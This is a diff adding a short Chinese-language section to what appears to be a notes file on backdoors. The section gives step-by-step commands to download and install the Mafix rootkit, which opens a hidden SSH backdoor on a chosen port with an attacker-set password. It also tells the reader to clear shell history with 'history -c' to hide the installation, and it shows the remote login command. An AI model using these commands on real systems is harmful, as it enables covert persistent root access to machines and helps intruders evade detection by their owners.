@@ -46,3 +46,15 @@ https://www.jianshu.com/p/3bdf8c5557e8<br>
 https://www.cnblogs.com/bravexz/p/9761411.html<br>
 https://github.com/sevck/icmp_Tunnel<br>
 https://blog.csdn.net/qq_33020901/article/details/81773737<br>
+
+4、mafix.tar.gz  rootkit后门<br>
+Mafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现让攻击者远程登陆的，特点是配置简单并可以自定义验证密码和端口号。
+kali 下测试通过，centos7不兼容<br>
+wget https://github.com/synjkc/backdoor/blob/master/mafix.tar.gz<br>
+tar -zxvf mafix.tar.gz<br>
+cd mafix<br>
+./root xiaoma 9999<br>
+
+安装rootkit 命令：./root 密码  端口   (如: ./root xiaoma 9999  接着用ssh连接它的9999端口，用户名是root，密码为xiaoma)
+安装完成后会自动删除目录，为了隐蔽，用 history -c 清除下命令就行了<br>
+控制端执行： ssh romote_ip -p9999
